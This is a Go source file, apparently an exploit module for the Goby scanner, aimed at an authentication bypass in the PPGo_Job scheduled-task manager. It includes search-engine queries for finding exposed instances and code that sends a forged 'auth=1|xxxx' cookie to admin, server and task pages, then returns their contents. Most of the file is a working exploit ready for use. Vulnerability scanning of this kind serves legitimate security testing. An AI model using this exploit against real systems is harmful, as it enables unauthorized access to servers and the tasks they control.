package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PPGo_Job Auth Login Bypass",
    "Description": "<p>PPGo_Job is a visual, multi-person, multi-authority, one-task, multi-machine timing task management system. It is developed by golang, is easy to install, consumes less resources, supports large concurrency, and can manage timing tasks on multiple servers at the same time.</p><p>The PPGo_Job timing task management system has an authentication bypass vulnerability. Attackers can bypass auth authentication to obtain sensitive system information and further control the system.</p>",
    "Impact": "PPGo_Job Auth Login Bypass",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/george518/PPGo_Job\">https://github.com/george518/PPGo_Job</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "PPGo_Job",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "PPGo_Job 认证绕过漏洞",
            "Description": "<p>PPGo_Job是一款可视化的、多人多权限的、一任务多机执行的定时任务管理系统，采用golang开发，安装方便，资源消耗少，支持大并发，可同时管理多台服务器上的定时任务。</p><p>PPGo_Job定时任务管理系统存在认证绕过漏洞，攻击者可绕过auth认证获取敏感系统信息，进一步控制系统。</p>",
            "Impact": "<p>PPGo_Job定时任务管理系统存在认证绕过漏洞，攻击者可绕过auth认证获取敏感系统信息，进一步控制系统。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://github.com/george518/PPGo_Job\">https://github.com/george518/PPGo_Job</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "PPGo_Job",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "PPGo_Job Auth Login Bypass",
            "Description": "<p>PPGo_Job is a visual, multi-person, multi-authority, one-task, multi-machine timing task management system. It is developed by golang, is easy to install, consumes less resources, supports large concurrency, and can manage timing tasks on multiple servers at the same time.</p><p>The PPGo_Job timing task management system has an authentication bypass vulnerability. Attackers can bypass auth authentication to obtain sensitive system information and further control the system.</p>",
            "Impact": "PPGo_Job Auth Login Bypass",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/george518/PPGo_Job\">https://github.com/george518/PPGo_Job</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "PPGo_Job",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"/static/layui/layui.js?t=1504439386550\"&& body=\"window.location.href\"",
    "GobyQuery": "body=\"/static/layui/layui.js?t=1504439386550\"&& body=\"window.location.href\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/george518/PPGo_Job",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "urlpath",
            "type": "createSelect",
            "value": "/admin/edit?id=1,/server/edit?id=1,/task/detail?id=1",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "PPGo_Job"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10244"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/admin/edit?id=1`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "auth=1|xxxx")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "编辑管理员") {
					return true
				}
			}
			uri1 := `/server/edit?id=1`
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "auth=1|xxxx")
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "编辑执行资源") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["urlpath"].(string)
			uri1 := cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "auth=1|xxxx")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = "use Cookie: auth=1|xxxx\n" + resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
